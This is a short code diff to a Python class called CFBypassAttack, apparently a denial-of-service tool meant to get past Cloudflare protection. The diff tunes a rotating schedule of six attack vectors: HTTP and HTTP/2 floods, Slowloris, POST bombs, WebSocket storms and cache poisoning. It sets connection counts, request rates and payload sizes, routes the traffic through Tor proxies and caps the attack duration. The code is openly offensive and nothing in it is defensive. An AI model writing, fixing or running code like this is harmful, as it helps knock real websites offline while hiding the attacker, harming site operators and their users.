@@ -41,14 +41,14 @@ class CFBypassAttack:
     
     def _build_vector_schedule(self, duration: int) -> List[VectorConfig]:
         """Build 6-vector rotation for the full duration."""
-        per_vector = duration // 6
+        per_vector = max(10, duration // 6)
         return [
-            VectorConfig(AttackVector.HTTP_FLOOD, per_vector, "HTTP flood", 100, 50*1024, 30),
-            VectorConfig(AttackVector.HTTP2_FLOOD, per_vector, "HTTP/2 flood", 50, 10*1024, 50),
-            VectorConfig(AttackVector.SLOWLORIS, per_vector, "Slowloris hold", 500, 1024, 100),
-            VectorConfig(AttackVector.POST_BOMB, per_vector, "POST bomb", 10, 1024*1024, 10),
-            VectorConfig(AttackVector.WEBSOCKET_STORM, per_vector, "WebSocket storm", 200, 1024, 50),
-            VectorConfig(AttackVector.CACHE_POISON, per_vector, "Cache poison", 100, 10*1024, 30),
+            VectorConfig(AttackVector.HTTP_FLOOD, per_vector, 100, 30.0, 50*1024, "HTTP flood"),
+            VectorConfig(AttackVector.HTTP2_FLOOD, per_vector, 50, 50.0, 10*1024, "HTTP/2 flood"),
+            VectorConfig(AttackVector.SLOWLORIS, per_vector, 500, 0.067, 1024, "Slowloris hold"),
+            VectorConfig(AttackVector.POST_BOMB, per_vector, 10, 0.5, 1024*1024, "POST bomb"),
+            VectorConfig(AttackVector.WEBSOCKET_STORM, per_vector, 200, 2.0, 1024, "WebSocket storm"),
+            VectorConfig(AttackVector.CACHE_POISON, per_vector, 100, 30.0, 10*1024, "Cache poison"),
         ]
     
     async def start(self, duration: int = 600) -> CFBypassAttackResult:
@@ -63,6 +63,7 @@ class CFBypassAttack:
             use_https=self.use_https,
             vector_schedule=schedule,
             proxies=self.tor_proxies,
+            max_duration=duration,
         )
         self.engine = engine
         
